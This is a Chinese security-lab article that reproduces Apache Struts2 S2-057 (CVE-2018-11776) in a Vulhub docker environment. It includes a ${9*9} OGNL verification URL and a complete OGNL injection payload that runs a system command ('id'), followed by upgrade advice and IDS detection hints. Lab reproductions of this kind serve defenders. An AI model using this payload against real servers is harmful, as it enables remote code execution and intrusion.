\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzU2NDgzOTQzNw==&mid=2247485821&idx=1&sn=d5a4e3c0980998216e8768eace3b54b6&chksm=fc459c1fcb321509cc6f10bf66510f99386f2b1da7e18aff47235a37ad5c99df7e3a98184d78&mpshare=1&scene=1&srcid=1013fNQBXcKNf9mQ7456D6VS&sharer\_sharetime=1602549009765&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=8c9049d0f83009fe0a0dbeb91e506cac763babe897f60ab8eb2ef5cb612963f6fb9f1919c7209df3626546c0c4275664355fb1b2a72c9a22350d065bd5f9c4b485db7700da1cc1c929bd93fe49a98cbfe577a9d9eeb72c63bf00b06541dd934fb5a343bbef88be040e637bedf47488b0267025fee95cddadf060bc0f2badd317&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AbKlenep%2BnGgkmmCwZQlzYM%3D&pass\_ticket=2G6SwO4uyYCX4aTiQDJvW1D1IrAJXn1CnpH%2BbX1rykSOMZNKPaotYwa2vyHnTBud&wx\_header=0)

  

  

网安引领时代，弥天点亮未来   

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x00 漏洞简述**  

  

  

2018 年 8 月 22 日，Apache Strust2 发布最新安全公告，Apache Struts2 存在远程代码执行的高危漏洞（S2-057/CVE-2018-11776）。该漏洞是由于在 Struts2 开发框架中使用 namespace 功能定义 XML 配置时，namespace 值未被设置且在上层动作配置（Action Configuration）中未设置或用通配符 namespace，可能导致远程代码执行。同理，url 标签未设置 value 和 action 值且上层动作未设置或用通配符 namespace 时也可能导致**远程代码执行**。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x01 影响版本**

  

Apache Struts2.3–Struts 2.3.34, Struts 2.5– Struts 2.5.16

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x02 漏洞复现**

  

  

虚拟机部署 docker 安装 Vulhub 一键搭建漏洞测试靶场环境。

```
docker-compose up -d
```

1、访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCTG6jUnJADS0vrDSeIriavY1uibP7g4ibkrnU5yUhPLmjdAqmCbbasTgV6PHarAicJU8eEChEILbvicjw/640?wx_fmt=png)

2、访问 / showcase 路径到 Struts2 测试页

http://192.168.60.131:8080/showcase

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCTG6jUnJADS0vrDSeIriavYrIN9OXKlAD2abjpy86qpYXgZu7l5ibWeG6qQSpOVic6O4QzBuSKEreag/640?wx_fmt=png)

3、Payload 验证漏洞是否存在

```
http://192.168.60.131:8080/struts2-showcase/$%7B9\*9%7D/actionChain1.action
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCTG6jUnJADS0vrDSeIriavYLmTL7manWnZNics5balp2Um7wwCXBBadE6IibVbRpdY4wibSE5cDqKD2A/640?wx_fmt=png)

返回结果

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCTG6jUnJADS0vrDSeIriavY7Zq3npJ5o82lH9YCh1aqARENicw7icRP3bszQzXugCAmr3yibPX7G5E6g/640?wx_fmt=png)

‍

4、POC 进行漏洞利用

```
${(#dm=@ognl.OgnlContext@DEFAULT\_MEMBER\_ACCESS).(#ct=#request\['struts.valueStack'\].context).(#cr=#ct\['com.opensymphony.xwork2.ActionContext.container'\]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

在利用时需要进行 URL 编码

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCTG6jUnJADS0vrDSeIriavY2Siauuo9icX2EIlN4o8pxJvN6546zS0nbKMLXpA08HB9wwXWzU9m7pug/640?wx_fmt=png)

命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCTG6jUnJADS0vrDSeIriavYEHdQUiaCmFQ9JYuZaHgwlyzRibIYiaZtkc0ns8O8V2Ef9Cibeia0VDYzVhw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCTG6jUnJADS0vrDSeIriavYwxg6rUHrbicViclpYQUfBqCx4r0PmRZKF6t1plfdHvT2fqlMTogXplNw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x03 修复建议**

  

  

1、将 ApacheStrust2 版本升级到官方最新版本

2、Web 应用，尽量保证代码的安全性。重点从 SDL 角度重视安全

3、对于 IDS 规则，数值计算和弹计算器返回的状态码都是 302，并且 Location 跳转字段含有特征句柄字符串；如果是命令回显返回的 200 状态码，且有命令结果输出。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x04 参考链接**

  

  

https://www.anquanke.com/post/id/157823

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif) 

知识分享完了

喜欢别忘了关注我们哦~  

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg)